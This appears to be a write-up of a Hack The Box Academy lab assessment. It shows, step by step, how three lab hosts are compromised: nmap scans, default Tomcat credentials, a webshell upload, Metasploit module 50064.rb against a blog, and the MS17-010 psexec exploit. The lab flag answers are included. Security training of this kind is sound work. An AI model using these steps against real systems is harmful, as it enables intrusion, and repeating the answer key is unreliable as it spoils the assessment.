# The Live Engagement
Found credentials at `/home/htb-student/Desktop/access-creds.txt`
1. What is the hostname of Host-1? (Format: all lower case) **Answer: shells-winsvr**
   - Perform nmap scan and observe that the target is providing a Apache Tomcat management dashboard at http://172.16.1.11:8080:
        ```
        $nmap -sV 172.16.1.11 
        Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-25 22:34 EDT
        Nmap scan report for status.inlanefreight.local (172.16.1.11)
        Host is up (0.037s latency).
        Not shown: 989 closed tcp ports (conn-refused)
        PORT     STATE SERVICE       VERSION
        80/tcp   open  http          Microsoft IIS httpd 10.0
        135/tcp  open  msrpc         Microsoft Windows RPC
        139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
        445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
        515/tcp  open  printer
        1801/tcp open  msmq?
        2103/tcp open  msrpc         Microsoft Windows RPC
        2105/tcp open  msrpc         Microsoft Windows RPC
        2107/tcp open  msrpc         Microsoft Windows RPC
        3389/tcp open  ms-wbt-server Microsoft Terminal Services
        8080/tcp open  http          Apache Tomcat 10.0.11
        Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
        ```
   - Visit http://172.16.1.11:8080/manager/html and try to login using one of the common [Apache Tomcat's credentials](https://gist.github.com/0xRar/70aae102af56495b7be51486d363c4bd)(`tomcat`:`Tomcatadm`).
   - Upload a `.war` webshell located at `/usr/share/laudanum/cmd.war`.
   - Visit the shell at http://172.16.1.11:8080/cmd/cmd.jsp and execute the `hostname` command to get the target's hostname.
2. Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case) **Answer: dev-share**
   - Use the above shell and execute this command: `cmd.exe /c dir C:\Shares`
3. What distribution of Linux is running on Host-2? (Format: distro name, all lower case) **Answer: ubuntu**
   - Perform a nmap scan → Read the SSH version.
4. What language is the shell written in that gets uploaded when using the 50064.rb exploit? **Answer: PHP**
   - Read the exploit at https://www.exploit-db.com/exploits/50064.
5. Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt **Answer: B1nD_Shells_r_cool**
   - Visit the site at http://blog.inlanefreight.local
   - Successfully log in using this credentials `admin`:`admin123!@#`
   - The blog page is suggesting to use the 50064.rb exploit. Use msfconsole with this module to get RCE:
      ```
      $ msfconsole
      msf6> use exploits/50064.rb
      msf6> set USERNAME admin
      msf6> set PASSWORD admin123!@#
      msf6> set RHOSTS 172.16.1.12  # read from /etc/hosts
      msf6> set VHOST blog.inlanefreight.local
      msf6> exploit
      msf6> cat /customscripts/flag.txt
      ```
6. What is the hostname of Host-3? **Answer: SHELLS-WINBLUE**
   - `sudo nmap -sV -sC 172.16.1.13` → Read the **Computer name** in the **smb-os-discovery** section.
7. Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt. **Answer: One-H0st-Down!**
   - Notice the vulnerable SMB version, use `msfconsole` with `exploit/windows/smb/ms17_010_psexec` module:
      ```
      $ msfconsole
      msf6> exploit/windows/smb/ms17_010_psexec
      msf6> set RHOSTS 172.16.1.13
      msf6> set LHOST 172.16.1.15      # internal IP using `ip a`
      msf6> exploit
      msf6> cd  ../../Users/Administrator/Desktop
      msf6> cat Skills-flag.txt
      ```
